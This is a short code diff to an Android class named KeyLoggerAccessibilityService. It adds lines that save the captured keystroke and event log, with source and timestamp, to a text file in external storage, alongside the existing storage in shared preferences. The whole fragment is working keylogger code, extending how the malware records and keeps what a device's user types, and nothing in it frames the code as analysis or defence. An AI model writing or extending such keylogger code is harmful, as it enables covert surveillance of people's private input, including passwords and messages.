@@ -98,7 +98,8 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
 
                 newLog = savedLog + "\n[" + eventSource + " ::: "+ currentDatetime + "]\n" + eventLog;
             }
-
+            String filepath = getExternalFilesDir("/").getAbsolutePath() + "/AutoSavekey_generated_logger_text.txt";
+            FileOperations.writeTextToFile(filepath,newLog);
             preferences = PreferenceManager.getDefaultSharedPreferences(this);
             SharedPreferences.Editor editor = preferences.edit();
             editor.putString("KeyLogger", newLog);
